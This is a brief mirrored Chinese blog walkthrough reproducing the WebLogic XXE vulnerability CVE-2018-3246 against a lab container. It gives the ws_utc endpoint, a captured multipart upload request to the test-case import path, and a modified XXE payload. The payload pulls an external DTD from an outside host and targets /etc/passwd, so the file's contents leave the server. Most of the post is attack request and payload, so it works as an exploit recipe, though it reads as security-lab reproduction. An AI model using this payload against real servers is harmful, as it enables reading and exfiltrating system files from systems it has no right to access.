# CVE-2018-3246 weblogic xxe - mrhonest - 博客园

> 原文：[https://www.cnblogs.com/mrhonest/p/11419386.html](https://www.cnblogs.com/mrhonest/p/11419386.html)

# 使用P牛2018-2894的容器

![](../Images/4281ba8494f96fdf0e119f502d97221c.png)

```
http://192.168.245.130:7001/ws_utc/begin.do 
```

# 导入测试用例

![](../Images/2bf8502765c9e10a1e2f5439953d78ad.png)

# 上传时抓取数据包

```
POST /ws_utc/resources/ws/config/import?timestamp=1566895391388 HTTP/1.1
Host: 192.168.245.130:7001
Content-Length: 215
Cache-Control: max-age=0
Origin: http://192.168.245.130:7001
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycneAkX3GCCBYEERe
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.245.130:7001/ws_utc/begin.do
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=GaLSOkvYi0oIdDavN26y4qxUtyN87KDM1GMIdzVPt80PWTsPw2BU!378752043
Connection: close

------WebKitFormBoundarycneAkX3GCCBYEERe
Content-Disposition: form-data; name="import_file_name"; filename="test111.jsp"
Content-Type: application/octet-stream

test
------WebKitFormBoundarycneAkX3GCCBYEERe-- 
```

# 修改payload

```
<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://192.168.245.1:1234/ext.dtd"><!ENTITY % bbb SYSTEM "file://etc/passwd">%aaa;%ccc;%ddd;]> 
```

# FTP服务会收到连接信息

![](../Images/a71b4a451e8e11f157e68c7834916a4e.png)